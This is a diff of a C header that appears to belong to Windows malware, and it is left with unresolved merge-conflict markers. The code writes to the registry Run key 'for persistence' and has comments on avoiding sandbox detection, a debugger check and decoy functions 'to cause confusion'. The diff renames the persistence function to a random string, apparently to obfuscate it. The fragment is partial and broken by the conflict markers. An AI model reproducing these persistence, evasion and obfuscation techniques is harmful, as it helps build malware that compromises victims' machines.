@@ -7,11 +7,18 @@
 const unsigned short TIME_TO_WAIT = 1000; // Avoid Sandbox detection
 
 // Check the Process Environment Block
+<<<<<<< HEAD
 BOOL CheckDebugger() {
     return TRUE;
 }
+=======
+/*BOOL CheckDebugger() {
+    return TRUE;
+}*/
+
+>>>>>>> f180b86 (Name changes)
 // Edit Registry for persistence
-void EditRegistry() {
+void b7nmffhhcb55ps4() {
     HKEY hKey = { 0 };
     LONG result;
     const TCHAR* keyPath = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -42,16 +49,17 @@ void EditRegistry() {
     RegCloseKey(hKey);
 }
 
-BOOL IsSandbox() {
+// Check if the process is running in a sandbox
+/*BOOL IsSandbox() {
     DWORD tickCount = GetTickCount64();
     if (tickCount < 60000) {
         return TRUE;
     }
     return FALSE;
-}
+}*/
 
 // Random functions to cause confusion
-BOOL SysTimeHandler(SYSTEMTIME& systemTime) {
+/*BOOL SysTimeHandler(SYSTEMTIME& systemTime) {
     GetSystemTime(&systemTime);
     Sleep(TIME_TO_WAIT);
     return TRUE;
@@ -69,5 +77,5 @@ BOOL HandleError() {
     DWORD error = GetLastError();
     return TRUE;
 }
-
+*/
 #endif // !STARTUP_H
